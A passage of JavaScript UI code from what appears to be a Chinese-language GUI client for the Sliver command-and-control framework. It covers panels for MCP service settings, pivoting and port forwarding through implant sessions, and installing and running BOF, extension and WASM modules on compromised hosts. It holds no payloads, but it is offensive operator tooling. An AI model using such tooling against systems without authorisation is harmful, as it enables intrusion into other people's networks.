  if (view === 'c2profiles') openC2ProfileEditor();
  if (view === 'infrastructure') openInfrastructurePanel();
  if (view === 'extensions') openExtensionCenter();
  if (view === 'team') openTeamCenter();
  if (view === 'mcp') openMCPPanel();
}

document.querySelectorAll('.tb-btn[data-view], .toolbar-menu-item[data-view]').forEach(btn => {
  btn.addEventListener('click', () => openToolbarView(btn.dataset.view));
});
document.querySelectorAll('.toolbar-menu-trigger').forEach(trigger => {
  trigger.addEventListener('click', e => {
    e.stopPropagation();
    const menu = trigger.closest('.toolbar-menu');
    const willOpen = !menu.classList.contains('open');
    closeToolbarMenus();
    if (willOpen) {
      menu.classList.add('open');
      trigger.setAttribute('aria-expanded', 'true');
      menu.querySelector('.toolbar-menu-item')?.focus();
    }
  });
});
document.addEventListener('click', e => { if (!e.target.closest('.toolbar-menu')) closeToolbarMenus(); });
document.addEventListener('keydown', e => { if (e.key === 'Escape' && document.querySelector('.toolbar-menu.open')) { e.preventDefault(); closeToolbarMenus(true); } });

// ── View panels (open in bottom interaction area) ──────────────────────────
// Config views (Generate, Listeners, Builds, Profiles, Events, Loot, Operators)
// render in a centered modal window rather than the cramped bottom console.
function openViewPanel(id, title, content) {
  document.getElementById('modal-title').textContent = title;
  document.getElementById('modal-body').innerHTML = content;
  document.querySelector('#modal-overlay .modal')?.classList.toggle('wide', ['_infrastructure','_extensions','_team','_profiles','_builds','_listeners','scripts','c2profiles','_c2edit','_c2view','_mcp'].includes(id));
  document.getElementById('modal-overlay').classList.remove('hidden');
}
function hideModal() { document.getElementById('modal-overlay').classList.add('hidden'); }
document.getElementById('modal-close').addEventListener('click', hideModal);

function compatibilityStatus(status) {
  if (status === 'available') return { label: '可用', cls: 'ok' };
  if (status === 'empty') return { label: '未配置', cls: 'empty' };
  return { label: '不可用', cls: 'err' };
}

async function openCompatibilityPanel() {
  openViewPanel('_compatibility', '服务器兼容性', '<div class="compat-loading"><span class="spinner"></span>正在读取团队服务器能力...</div>');
  const snapshot = await App().GetServerCompatibility().catch(error => ({ error }));
  const body = document.getElementById('modal-body');
  if (!body || document.getElementById('modal-overlay').classList.contains('hidden')) return;
  if (snapshot.error) {
    body.innerHTML = rpcErrorHtml(snapshot.error, '无法读取兼容性信息');
    return;
  }

  const gui = snapshot.gui || {};
  const dependencies = gui.dependencies || {};
  const generatedAt = snapshot.generatedAt ? new Date(snapshot.generatedAt).toLocaleString() : '-';
  const items = (snapshot.items || []).map(item => {
    const status = compatibilityStatus(item.status);
    const details = (item.details || []).filter(Boolean);
    return `<section class="compat-item">
      <div class="compat-item-head">
        <div><h3>${esc(item.label)}</h3><p>${esc(item.summary || '')}</p></div>
        <span class="compat-badge ${status.cls}">${status.label}</span>
      </div>
      ${details.length ? `<div class="compat-tags">${details.map(detail => `<span>${esc(detail)}</span>`).join('')}</div>` : ''}
      ${item.error ? `<details class="compat-detail"><summary>查看原始错误</summary><code>${esc(rpcError(item.error).detail || item.error)}</code></details>` : ''}
    </section>`;
  }).join('');

  body.innerHTML = `<div class="compat-overview">
      <div><span>团队服务器</span><strong>${esc(snapshot.teamserver || '-')}</strong></div>
      <div><span>操作员</span><strong>${esc(snapshot.operator || '-')}</strong></div>
      <div><span>GUI 版本</span><strong>${esc(gui.version || 'dev')} · ${esc(gui.gitCommit || 'unknown')}</strong></div>
      <div><span>Wails</span><strong>${esc(dependencies.wails || 'unknown')}</strong></div>
      <div><span>Sliver 客户端依赖</span><strong>${esc(dependencies.sliver || 'unknown')}</strong></div>
      <div><span>Protobuf</span><strong>${esc(dependencies.protobuf || 'unknown')}</strong></div>
      <div><span>检测时间</span><strong>${esc(generatedAt)}</strong></div>
    </div>
    <div class="compat-note">此页面仅调用只读 RPC，不会修改远程团队服务器配置。</div>
    <section class="compat-item">
      <div class="compat-item-head">
        <div><h3>客户端侧 MCP</h3><p>当前 GUI 依赖已包含实验性 MCP HTTP/SSE 服务。服务在本机运行并复用当前连接，不表示远程 Teamserver 自身开放了 MCP。</p></div>
        <span class="compat-badge ok">可用</span>
      </div>
      <div class="compat-tags"><span>按工具依赖 RPC</span><span>旧服务器可能只支持部分工具</span><span>默认仅监听环回地址</span></div>
    </section>
    <div class="compat-list">${items || '<div class="compat-error">没有返回能力信息。</div>'}</div>`;
}
document.getElementById('compatibility-btn').addEventListener('click', openCompatibilityPanel);

function mcpStatusHtml(status = {}) {
  const running = !!status.running;
  const tools = status.tools || [];
  return `<div class="mcp-center">
    <div class="mcp-banner"><div><strong>实验性客户端服务</strong><p>MCP 在本机 GUI 进程内运行，并复用当前 Teamserver 连接。旧服务器缺少的 RPC 会在对应工具调用时返回错误。</p></div><span class="mcp-state ${running ? 'running' : 'stopped'}">${running ? '运行中' : '已停止'}</span></div>
    <div class="mcp-layout">
      <section class="mcp-config">
        <div class="section-heading"><div><h3>服务配置</h3><p>默认仅允许本机客户端访问。</p></div></div>
        <div class="gen-row">
          <div class="gen-field"><label for="mcp-transport">传输方式</label><select id="mcp-transport" ${running ? 'disabled' : ''}><option value="http" ${status.transport === 'http' ? 'selected' : ''}>HTTP</option><option value="sse" ${status.transport !== 'http' ? 'selected' : ''}>SSE</option></select></div>
          <div class="gen-field"><label for="mcp-address">监听地址</label><input id="mcp-address" value="${esc(status.listenAddress || '127.0.0.1:8080')}" ${running ? 'disabled' : ''}/></div>
        </div>
        <div class="mcp-actions"><button id="mcp-toggle" class="btn ${running ? '' : 'accent'}">${running ? '停止服务' : '启动服务'}</button><button id="mcp-refresh" class="btn">刷新状态</button><span id="mcp-action-result"></span></div>
      </section>
      <section class="mcp-details">
        <div class="section-heading"><div><h3>连接信息</h3><p>完整令牌不会进入页面状态或操作日志。</p></div></div>
        <dl class="mcp-kv">
          <div><dt>端点</dt><dd><code>${esc(status.endpoint || '-')}</code>${running ? '<button id="mcp-copy-endpoint" class="btn small">复制</button>' : ''}</dd></div>
          <div><dt>认证请求头</dt><dd><code>${esc(status.authHeader || 'Authorization')}</code></dd></div>
          <div><dt>认证令牌</dt><dd><code>${esc(status.maskedToken || '-')}</code>${running ? '<button id="mcp-copy-token" class="btn small">复制令牌</button>' : ''}</dd></div>
          <div><dt>认证配置</dt><dd><code>${esc(status.authConfigPath || '-')}</code></dd></div>
          <div><dt>启动时间</dt><dd><code>${esc(status.startedAt || '-')}</code></dd></div>
        </dl>
      </section>
    </div>
    ${status.lastError ? `<div class="compat-error"><strong>最近错误</strong><span>${esc(status.lastError)}</span></div>` : ''}
    <section class="mcp-tools"><div class="section-heading"><div><h3>当前官方工具</h3><p>工具是否可执行取决于远程 Teamserver 对底层 RPC 的支持。</p></div><span>${tools.length} 项</span></div><div class="compat-tags">${tools.map(tool => `<span>${esc(tool)}</span>`).join('')}</div></section>
  </div>`;
}

async function renderMCPPanel(status) {
  const body = document.getElementById('modal-body');
  if (!body || document.getElementById('modal-overlay').classList.contains('hidden')) return;
  body.innerHTML = mcpStatusHtml(status);
  document.getElementById('mcp-refresh')?.addEventListener('click', openMCPPanel);
  document.getElementById('mcp-copy-endpoint')?.addEventListener('click', async () => {
    try { await navigator.clipboard.writeText(status.endpoint); toast('ok', 'MCP 端点已复制'); }
    catch (error) { toastRpcError(error, '复制端点失败'); }
  });
  document.getElementById('mcp-copy-token')?.addEventListener('click', async () => {
    try { await App().CopyMCPToken(); toast('ok', 'MCP 令牌已复制到系统剪贴板'); }
    catch (error) { toastRpcError(error, '复制令牌失败'); }
  });
  document.getElementById('mcp-toggle')?.addEventListener('click', async () => {
    const result = document.getElementById('mcp-action-result');
    result.textContent = status.running ? '正在停止...' : '正在启动...';
    try {
      if (status.running) await App().StopMCP();
      else {
        const transport = document.getElementById('mcp-transport').value;
        const listenAddress = document.getElementById('mcp-address').value.trim() || '127.0.0.1:8080';
        const host = listenAddress.startsWith('[') ? listenAddress.slice(1, listenAddress.indexOf(']')) : listenAddress.slice(0, listenAddress.lastIndexOf(':'));
        const loopback = ['127.0.0.1', '::1', 'localhost'].includes(host.toLowerCase());
        let allowNonLoopback = false;
        if (!loopback) {
          allowNonLoopback = await uiConfirm(`监听 ${listenAddress} 可能让网络中的其他设备访问 MCP 服务。认证令牌仍然必需，是否继续？`, { title:'确认非本机监听', okLabel:'继续启动', danger:true });
          if (!allowNonLoopback) { result.textContent = ''; return; }
        }
        await App().StartMCP({ transport, listenAddress, allowNonLoopback });
      }
      await openMCPPanel();
    } catch (error) {
      result.textContent = rpcError(error, status.running ? '停止 MCP 失败' : '启动 MCP 失败').message;
      result.className = 'mcp-action-error';
    }
  });
}

async function openMCPPanel() {
  openViewPanel('_mcp', 'MCP 服务', '<div class="compat-loading"><span class="spinner"></span>正在读取 MCP 服务状态...</div>');
  try { await renderMCPPanel(await App().GetMCPStatus()); }
  catch (error) { document.getElementById('modal-body').innerHTML = rpcErrorHtml(error, '读取 MCP 状态失败'); }
}

const INFRA_ROUTE_LABELS = {
  socks: 'SOCKS', forward: '正向转发', 'reverse-forward': '反向转发',
  'wireguard-forward': 'WireGuard 转发', 'wireguard-socks': 'WireGuard SOCKS',
  'pivot-tcp': 'Pivot TCP', 'pivot-pipe': 'Pivot 命名管道', 'pivot-namedpipe': 'Pivot 命名管道',
};

function endpointParts(value) {
  const text = String(value || '').trim();
  if (text.startsWith('[')) {
    const end = text.indexOf(']');
    return { host: text.slice(1, end), port: Number(text.slice(end + 2)) };
  }
  const split = text.lastIndexOf(':');
  return { host: text.slice(0, split), port: Number(text.slice(split + 1)) };
}

async function openInfrastructurePanel() {
  openViewPanel('_infrastructure', '网络基础设施', '<div class="infra-loading"><span class="spinner"></span>正在汇总 Pivot 与活动转发...</div>');
  let snapshot;
  try { snapshot = await App().GetInfrastructureSnapshot(); }
  catch (error) {
    document.getElementById('modal-body').innerHTML = rpcErrorHtml(error, '加载基础设施失败');
    return;
  }
  renderInfrastructurePanel(snapshot || { nodes: [], routes: [], warnings: [] });
}

function renderInfrastructurePanel(snapshot) {
  const nodes = snapshot.nodes || [], routes = snapshot.routes || [];
  const sessionOptions = nodes.filter(node => node.status === 'online').map(node =>
    `<option value="${esc(node.id)}">${esc(node.name || node.id.slice(0, 8))} · ${esc(node.transport || '未知传输')}</option>`).join('');
  const routeOptions = Object.entries(INFRA_ROUTE_LABELS).filter(([key]) => key !== 'pivot-namedpipe').map(([key, value]) => `<option value="${key}">${value}</option>`).join('');
  const nodeRows = nodes.map(node => {
    const impacted = node.downstream || [];
    const parent = nodes.find(item => item.id === node.parentId);
    return `<div class="infra-node ${node.status === 'offline' ? 'offline' : ''}">
      <div class="infra-node-head"><strong>${esc(node.name || node.id.slice(0, 8))}</strong><span class="state ${esc(node.status)}">${node.status === 'online' ? '在线' : '离线'}</span></div>
      <div>${esc(node.address || '-')} · ${esc(node.transport || '未知传输')}</div>
      <div>上游：${esc(parent?.name || (node.parentId ? node.parentId.slice(0, 8) : 'Teamserver'))}</div>
      <div class="infra-impact">下游影响：${impacted.length ? `${impacted.length} 个（${impacted.map(id => id.slice(0, 8)).join('、')}）` : '无'}</div>
    </div>`;
  }).join('') || '<div class="empty-state">暂无在线或历史 Session 节点</div>';
  const warningHtml = (snapshot.warnings || []).map(item => `<div class="infra-warning">${esc(item)}</div>`).join('');
  const html = `<div class="infra-center">
    ${warningHtml}
    <section class="infra-section"><div class="section-heading"><div><h3>拓扑与影响范围</h3><p>Pivot 树来自 Teamserver；失联节点会同步标出其下游影响。</p></div><button class="btn small" id="infra-refresh">刷新</button></div><div class="infra-nodes">${nodeRows}</div></section>
    <section class="infra-section"><div class="section-heading"><div><h3>活动路由</h3><p>统一查看和停止 SOCKS、端口转发、WireGuard 与 Pivot。</p></div></div>
      <div class="infra-filters"><select id="infra-type-filter"><option value="">全部类型</option>${routeOptions}</select><select id="infra-session-filter"><option value="">全部 Session</option>${sessionOptions}</select><select id="infra-status-filter"><option value="">全部状态</option><option value="online">在线</option><option value="offline">离线</option></select><select id="infra-source-filter"><option value="">全部来源</option><option value="teamserver">Teamserver</option><option value="client">客户端本地</option></select></div>
      <div class="table-wrap"><table class="data-table infra-table"><thead><tr><th>类型</th><th>Session</th><th>监听</th><th>目标</th><th>状态</th><th>来源</th><th></th></tr></thead><tbody id="infra-routes"></tbody></table></div>
    </section>
    <section class="infra-section"><div class="section-heading"><div><h3>新建路由</h3><p>提交前检查端口和地址；目标可达性仍取决于植入体所在网络。</p></div></div>
      <div class="infra-create"><label>Session<select id="infra-create-session" ${sessionOptions ? '' : 'disabled'}>${sessionOptions || '<option>无在线 Session</option>'}</select></label><label>类型<select id="infra-create-type">${routeOptions}</select></label><label>监听地址<input id="infra-create-listen" value="127.0.0.1:1080"/></label><label id="infra-target-field">目标地址<input id="infra-create-target" placeholder="host:port"/></label></div>
      <div id="infra-preflight" class="infra-preflight">等待预检</div><div class="infra-actions"><button class="btn accent" id="infra-create-btn" disabled>创建路由</button></div>
    </section>
  </div>`;
  openViewPanel('_infrastructure', '网络基础设施', html);

  const filters = ['infra-type-filter','infra-session-filter','infra-status-filter','infra-source-filter'];
  const drawRoutes = () => {
    const selected = Object.fromEntries(filters.map(id => [id, document.getElementById(id)?.value || '']));
    const visible = routes.filter(route =>
      (!selected['infra-type-filter'] || route.type === selected['infra-type-filter']) &&
      (!selected['infra-session-filter'] || route.sessionId === selected['infra-session-filter']) &&
      (!selected['infra-status-filter'] || route.status === selected['infra-status-filter']) &&
      (!selected['infra-source-filter'] || route.source === selected['infra-source-filter']));
    const tbody = document.getElementById('infra-routes');
    if (!tbody) return;
    tbody.innerHTML = visible.map((route, index) => `<tr><td>${esc(INFRA_ROUTE_LABELS[route.type] || route.type)}</td><td>${esc(route.session || route.sessionId.slice(0, 8))}</td><td><code>${esc(route.listen || '-')}</code></td><td><code>${esc(route.target || '-')}</code></td><td><span class="state ${esc(route.status)}">${route.status === 'online' ? '在线' : '离线'}</span></td><td>${route.source === 'teamserver' ? 'Teamserver' : '客户端'}</td><td><button class="btn small danger infra-stop" data-index="${routes.indexOf(route)}">停止</button></td></tr>`).join('') || '<tr><td colspan="7" class="empty-state">没有符合条件的活动路由</td></tr>';
    tbody.querySelectorAll('.infra-stop').forEach(button => button.addEventListener('click', () => stopInfrastructureRoute(routes[Number(button.dataset.index)], nodes)));
  };
  filters.forEach(id => document.getElementById(id)?.addEventListener('change', drawRoutes));
  drawRoutes();
  document.getElementById('infra-refresh')?.addEventListener('click', openInfrastructurePanel);

  const type = document.getElementById('infra-create-type'), listen = document.getElementById('infra-create-listen'), target = document.getElementById('infra-create-target');
  let preflightSeq = 0;
  const configureForm = () => {
    const specs = {
      socks: ['127.0.0.1:1080', false], forward: ['127.0.0.1:8080', true], 'reverse-forward': ['0.0.0.0:8080', true],
      'wireguard-forward': ['127.0.0.1:8080', true], 'wireguard-socks': ['127.0.0.1:1080', false],
      'pivot-tcp': ['0.0.0.0:9898', false], 'pivot-pipe': ['\\\\.\\pipe\\sliver-pivot', false],
    };
    const spec = specs[type.value];
    listen.value = spec[0];
    document.getElementById('infra-target-field').classList.toggle('hidden', !spec[1]);
    runPreflight();
  };
  const runPreflight = async () => {
    const seq = ++preflightSeq, resultEl = document.getElementById('infra-preflight'), createButton = document.getElementById('infra-create-btn');
    createButton.disabled = true; resultEl.textContent = '正在预检...'; resultEl.className = 'infra-preflight pending';
    try {
      const result = await App().PreflightNetworkRoute(type.value, listen.value, target.value);
      if (seq !== preflightSeq) return;
      const errors = result.errors || [], warnings = result.warnings || [];
      resultEl.innerHTML = [...errors.map(value => `<span class="err">${esc(value)}</span>`), ...warnings.map(value => `<span class="warn">${esc(value)}</span>`), ...(errors.length || warnings.length ? [] : ['<span class="ok">预检通过，可以创建</span>'])].join('');
      resultEl.className = `infra-preflight ${result.valid ? 'ok' : 'err'}`;
      createButton.disabled = !result.valid || !document.getElementById('infra-create-session').value;
    } catch (error) { resultEl.innerHTML = rpcErrorHtml(error, '路由预检失败'); resultEl.className = 'infra-preflight err'; }
  };
  type.addEventListener('change', configureForm); listen.addEventListener('input', runPreflight); target.addEventListener('input', runPreflight);
  document.getElementById('infra-create-session')?.addEventListener('change', runPreflight);
  document.getElementById('infra-create-btn')?.addEventListener('click', createInfrastructureRoute);
  runPreflight();
}

async function createInfrastructureRoute() {
  const sessionID = document.getElementById('infra-create-session').value;
  const kind = document.getElementById('infra-create-type').value;
  const listen = document.getElementById('infra-create-listen').value;
  const target = document.getElementById('infra-create-target').value;
  const local = endpointParts(listen), remote = endpointParts(target);
  const calls = {
    socks: () => App().StartSocksProxy(sessionID, local.port),
    forward: () => App().AddPortForward(sessionID, local.port, remote.host, remote.port),
    'reverse-forward': () => App().StartRportFwd(sessionID, local.host, local.port, remote.host, remote.port),
    'wireguard-forward': () => App().WGStartPortForward(sessionID, local.port, target),
    'wireguard-socks': () => App().WGStartSocks(sessionID, local.port),
    'pivot-tcp': () => App().StartPivotListener(sessionID, 'tcp', listen),
    'pivot-pipe': () => App().StartPivotListener(sessionID, 'pipe', listen),
  };
  const button = document.getElementById('infra-create-btn'); button.disabled = true;
  try { await calls[kind](); toast('ok', `${INFRA_ROUTE_LABELS[kind]}已创建`); await openInfrastructurePanel(); }
  catch (error) { toastRpcError(error, '创建路由失败'); button.disabled = false; }
}

async function stopInfrastructureRoute(route, nodes) {
  const node = nodes.find(item => item.id === route.sessionId), impacted = node?.downstream?.length || 0;
  const calls = {
    socks: () => App().StopSocksProxy(route.sessionId),
    forward: () => App().RemovePortForward(route.sessionId, Number(route.id)),
    'reverse-forward': () => App().StopRportFwd(route.sessionId, Number(route.id)),
    'wireguard-forward': () => App().WGStopPortForward(route.sessionId, Number(route.id)),
    'wireguard-socks': () => App().WGStopSocks(route.sessionId, Number(route.id)),
    'pivot-tcp': () => App().StopPivotListener(route.sessionId, Number(route.id)),
    'pivot-pipe': () => App().StopPivotListener(route.sessionId, Number(route.id)),
    'pivot-namedpipe': () => App().StopPivotListener(route.sessionId, Number(route.id)),
  };
  await runDangerousAction({
    title: '停止网络路由', okLabel: '停止',
    message: `确定停止 ${esc(INFRA_ROUTE_LABELS[route.type] || route.type)}（${esc(route.listen || route.id)}）吗？所属节点 ${esc(route.session || route.sessionId.slice(0,8))}${impacted ? ` 关联 ${impacted} 个下游节点，请确认影响范围。` : ' 无下游节点。'}`,
    action: calls[route.type], success: '网络路由已停止', refresh: openInfrastructurePanel,
  });
}

let extensionCenterState = { tab: 'installed', snapshot: null, armory: null, selectedCommand: '' };

async function openExtensionCenter(tab = extensionCenterState.tab) {
  extensionCenterState.tab = tab;
  openViewPanel('_extensions', '扩展中心', '<div class="infra-loading"><span class="spinner"></span>正在读取本地扩展与 Builder 状态...</div>');
  try { extensionCenterState.snapshot = await App().GetExtensionCenterSnapshot(); }
  catch (error) { document.getElementById('modal-body').innerHTML = rpcErrorHtml(error, '加载扩展中心失败'); return; }
  renderExtensionCenter();
}

function renderExtensionCenter() {
  const state = extensionCenterState, snapshot = state.snapshot || { commands: [], builders: [], records: [], warnings: [] };
  const tabs = [['installed','已安装'],['armory','Armory'],['execute','执行'],['wasm','WASM'],['builders','Builder']];
  const warnings = (snapshot.warnings || []).map(value => `<div class="ext-risk">${esc(value)}</div>`).join('');
  const html = `<div class="extension-center"><div class="ext-tabs">${tabs.map(([id,label]) => `<button class="ext-tab${state.tab === id ? ' active' : ''}" data-ext-tab="${id}">${label}</button>`).join('')}</div>${warnings}<div id="ext-content"></div></div>`;
  openViewPanel('_extensions', '扩展中心', html);
  document.querySelectorAll('[data-ext-tab]').forEach(button => button.addEventListener('click', () => { state.tab = button.dataset.extTab; renderExtensionCenter(); }));
  const content = document.getElementById('ext-content');
  if (state.tab === 'installed') renderInstalledExtensions(content, snapshot.commands || []);
  if (state.tab === 'armory') renderArmory(content);
  if (state.tab === 'execute') renderExtensionExecution(content, snapshot);
  if (state.tab === 'wasm') renderWasmCenter(content, snapshot);
  if (state.tab === 'builders') renderBuilderCenter(content, snapshot);
}

function renderInstalledExtensions(content, commands) {
  content.innerHTML = `<div class="section-heading"><div><h3>本地已安装命令</h3><p>版本和平台来自 Manifest，哈希由客户端在本地计算。</p></div><span>${commands.length} 个命令</span></div><div class="ext-list">${commands.map(command => `<article class="ext-item"><div class="ext-item-main"><strong>${esc(command.command)}</strong><span class="tag">${command.kind === 'bof' ? 'BOF/COFF' : 'Extension'}</span><span>${esc(command.extension)} ${esc(command.version || '版本未知')}</span></div><p>${esc(command.help || '无说明')}</p><div class="ext-meta"><span>平台：${esc((command.platforms || []).join(', ') || '未声明')}</span><span>完整性：${esc(command.integrity)}${command.integritySha ? ` · ${esc(command.integritySha.slice(0,16))}...` : ''}</span></div><div class="ext-risk inline">${esc(command.risk)}</div><button class="btn small ext-run" data-command="${esc(command.command)}">执行</button></article>`).join('') || '<div class="empty-state">尚未安装可执行扩展</div>'}</div>`;
  content.querySelectorAll('.ext-run').forEach(button => button.addEventListener('click', () => { extensionCenterState.selectedCommand = button.dataset.command; extensionCenterState.tab = 'execute'; renderExtensionCenter(); }));
}

async function renderArmory(content) {
  if (!extensionCenterState.armory) {
    content.innerHTML = '<div class="infra-loading"><span class="spinner"></span>正在读取 Armory 索引...</div>';
    try { extensionCenterState.armory = await App().ArmoryList(); }
    catch (error) { content.innerHTML = rpcErrorHtml(error, '加载 Armory 失败'); return; }
  }
  const packages = extensionCenterState.armory || [];
  content.innerHTML = `<div class="section-heading"><div><h3>Armory 软件包</h3><p>来源为 Sliver 官方 Armory 索引；当前完整性状态为“签名未验证”。</p></div><button class="btn small" id="armory-refresh">刷新索引</button></div><div class="ext-list">${packages.map(pkg => `<article class="ext-item"><div class="ext-item-main"><strong>${esc(pkg.name)}</strong><code>${esc(pkg.commandName)}</code><span class="tag">${pkg.type === 'alias' ? 'Alias' : 'Extension'}</span><span>${pkg.installed ? '已安装' : '可安装'}</span></div><p>${esc(pkg.description || '无说明')}</p><div class="ext-meta"><span>版本：${esc(pkg.version || '索引未提供')}</span><span>来源：${esc(pkg.url || 'sliverarmory')}</span><span>完整性：签名未验证</span><span>包类型：由官方索引确定</span></div><div class="ext-actions"><button class="btn small armory-install" data-name="${esc(pkg.commandName)}">${pkg.installed ? '更新 / 重装' : '安装'}</button>${pkg.installed ? `<button class="btn small danger armory-remove" data-name="${esc(pkg.commandName)}">卸载</button>` : ''}</div></article>`).join('') || '<div class="empty-state">Armory 索引中暂无软件包</div>'}</div>`;
  document.getElementById('armory-refresh')?.addEventListener('click', () => { extensionCenterState.armory = null; renderArmory(content); });
  content.querySelectorAll('.armory-install').forEach(button => button.addEventListener('click', async () => { await installArmoryPackage(button.dataset.name); extensionCenterState.armory = null; await openExtensionCenter('armory'); }));
  content.querySelectorAll('.armory-remove').forEach(button => button.addEventListener('click', () => runDangerousAction({ title:'卸载扩展', message:`确定卸载“${esc(button.dataset.name)}”吗？`, okLabel:'卸载', action:()=>App().ArmoryRemove(button.dataset.name), success:'扩展已卸载', refresh:async()=>{ extensionCenterState.armory=null; await openExtensionCenter('armory'); } })));
}

function commandPreview(command, args) {
  return `ext ${command.command}${args.length ? ' ' + args.map(value => value ? `<${value}>` : '<未填写>').join(' ') : ''}`;
}

function renderExtensionExecution(content, snapshot) {
  const commands = snapshot.commands || [], sessions = allSessions.filter(session => !session.isDead);
  const selected = commands.find(item => item.command === extensionCenterState.selectedCommand) || commands[0];
  extensionCenterState.selectedCommand = selected?.command || '';
  content.innerHTML = `<div class="ext-execute-layout"><div><label class="ext-label">Session<select id="ext-session">${sessions.map(session => `<option value="${esc(session.id)}">${esc(session.hostname || session.name || session.id.slice(0,8))} · ${esc(session.os)}/${esc(session.arch)}</option>`).join('') || '<option value="">无在线 Session</option>'}</select></label><label class="ext-label">命令<select id="ext-command">${commands.map(command => `<option value="${esc(command.command)}" ${command.command === selected?.command ? 'selected' : ''}>${esc(command.command)} · ${esc(command.kind)}</option>`).join('') || '<option value="">无已安装命令</option>'}</select></label><div id="ext-command-detail"></div></div><div><h3>执行记录</h3><div class="ext-records">${(snapshot.records || []).slice().reverse().map(record => `<div><strong>${esc(record.command)}</strong><span>${record.kind.toUpperCase()} · ${record.status === 'success' ? '成功' : '失败'} · ${new Date(record.finishedAt).toLocaleString()}</span><small>${esc(record.summary)}</small></div>`).join('') || '<div class="empty-state">暂无执行记录</div>'}</div></div></div>`;
  const draw = () => {
    const command = commands.find(item => item.command === document.getElementById('ext-command').value);
    const detail = document.getElementById('ext-command-detail'); if (!command) { detail.innerHTML = '<div class="empty-state">请选择命令</div>'; return; }
    const platform = (command.platforms || []).join(', ') || '未声明';
    detail.innerHTML = `<div class="ext-command-head"><p>${esc(command.help || '无说明')}</p><span>兼容平台：${esc(platform)}</span></div><div class="ext-args">${(command.arguments || []).map((arg,index) => `<label>${esc(arg.name)} · ${esc(arg.type)}${arg.required ? ' *' : ''}<input data-ext-arg="${index}" type="${arg.type === 'int' || arg.type === 'integer' || arg.type === 'short' ? 'number' : 'text'}" placeholder="${esc(arg.help || arg.name)}"/></label>`).join('') || '<span class="muted">此命令没有参数</span>'}</div><div class="command-preview" id="ext-preview"></div><div class="ext-risk inline">${esc(command.risk)}</div><div class="ext-actions"><button class="btn accent" id="ext-execute" ${sessions.length ? '' : 'disabled'}>执行命令</button></div><pre class="ext-output hidden" id="ext-output"></pre>`;
    const refreshPreview = () => { const names = [...detail.querySelectorAll('[data-ext-arg]')].map((input,index) => input.value ? command.arguments[index].name : command.arguments[index].name); document.getElementById('ext-preview').textContent = commandPreview(command, names); };
    detail.querySelectorAll('[data-ext-arg]').forEach(input => input.addEventListener('input', refreshPreview)); refreshPreview();
    document.getElementById('ext-execute')?.addEventListener('click', async () => {
      const args = [...detail.querySelectorAll('[data-ext-arg]')].map(input => input.value);
      const missing = (command.arguments || []).find((arg,index) => arg.required && !args[index]);
      if (missing) return toast('err', `请填写必填参数：${missing.name}`);
      const button = document.getElementById('ext-execute'); button.disabled = true;
      try {
        const output = await App().RunExtension(document.getElementById('ext-session').value, command.command, args);
        const outputBox = document.getElementById('ext-output');
        outputBox.textContent = output || '执行完成，无输出。'; outputBox.classList.remove('hidden');
        toast('ok', '扩展执行完成'); button.disabled = false;
      }
      catch (error) { toastRpcError(error, '扩展执行失败'); button.disabled = false; }
    });
  };
  document.getElementById('ext-command')?.addEventListener('change', event => { extensionCenterState.selectedCommand = event.target.value; draw(); }); draw();
}

function renderWasmCenter(content, snapshot) {
  const sessions = allSessions.filter(session => !session.isDead);
  content.innerHTML = `<div class="section-heading"><div><h3>WASM 扩展</h3><p>注册本地模块到选定 Session，并直接执行已注册模块。</p></div></div><div class="wasm-form"><label>Session<select id="wasm-session">${sessions.map(session => `<option value="${esc(session.id)}">${esc(session.hostname || session.id.slice(0,8))}</option>`).join('') || '<option value="">无在线 Session</option>'}</select></label><label>模块名称<input id="wasm-name" placeholder="可留空，默认使用文件名"/></label><label>本地文件<div class="file-picker"><input id="wasm-path" readonly placeholder="未选择"/><button class="btn small" id="wasm-pick">选择</button></div></label><div class="ext-actions"><button class="btn accent" id="wasm-register" disabled>注册模块</button><button class="btn small" id="wasm-list" ${sessions.length ? '' : 'disabled'}>刷新模块列表</button></div></div><div id="wasm-modules" class="ext-list"></div><pre class="ext-output hidden" id="wasm-output"></pre>`;
  const path = document.getElementById('wasm-path'), register = document.getElementById('wasm-register');
  document.getElementById('wasm-pick')?.addEventListener('click', async () => { const value = await App().PickWasmFile().catch(error => { toastRpcError(error, '选择 WASM 文件失败'); return ''; }); if (value) { path.value = value; register.disabled = !sessions.length; } });
  document.getElementById('wasm-register')?.addEventListener('click', async () => { register.disabled = true; try { await App().RegisterWasmExtension(document.getElementById('wasm-session').value, document.getElementById('wasm-name').value, path.value); toast('ok','WASM 模块已注册'); await list(); } catch(error) { toastRpcError(error,'注册 WASM 失败'); register.disabled=false; } });
  const list = async () => {
    const box=document.getElementById('wasm-modules'), sid=document.getElementById('wasm-session').value; if(!sid)return;
    box.innerHTML='<div class="infra-loading"><span class="spinner"></span>正在读取...</div>';
    try {
      const names=await App().ListWasmExtensions(sid);
      box.innerHTML=(names||[]).map(name=>`<article class="ext-item"><div class="ext-item-main"><strong>${esc(name)}</strong><span class="tag">WASM</span></div><label class="ext-label">参数（按空格分隔）<input data-wasm-name="${esc(name)}" autocomplete="off" placeholder="arg1 arg2"/></label><div class="command-preview">wasm exec ${esc(name)} &lt;参数&gt;</div><button class="btn small wasm-execute" data-name="${esc(name)}">执行</button></article>`).join('')||'<div class="empty-state">该 Session 尚无已注册 WASM 模块</div>';
      box.querySelectorAll('.wasm-execute').forEach((button, index) => button.addEventListener('click', async () => {
        const input = box.querySelectorAll('[data-wasm-name]')[index];
        const args = String(input?.value || '').trim().split(/\s+/).filter(Boolean);
        button.disabled = true;
        try {
          const result = await App().ExecWasmExtension(sid, button.dataset.name, args);
          if (result.error) throw new Error(result.error);
          const output = document.getElementById('wasm-output');
          output.textContent = [result.stdout, result.stderr].filter(Boolean).join('\n') || `执行完成，退出码 ${result.status ?? 0}。`;
          output.classList.remove('hidden'); toast('ok','WASM 执行完成');
          extensionCenterState.snapshot = await App().GetExtensionCenterSnapshot();
        } catch(error) { toastRpcError(error,'WASM 执行失败'); }
        finally { button.disabled = false; }
      }));
    } catch(error){box.innerHTML=rpcErrorHtml(error,'读取 WASM 列表失败');}
  };
  document.getElementById('wasm-list')?.addEventListener('click',list); document.getElementById('wasm-session')?.addEventListener('change',list); if(sessions.length)list();
}

function renderBuilderCenter(content, snapshot) {
  const builders = snapshot.builders || [];
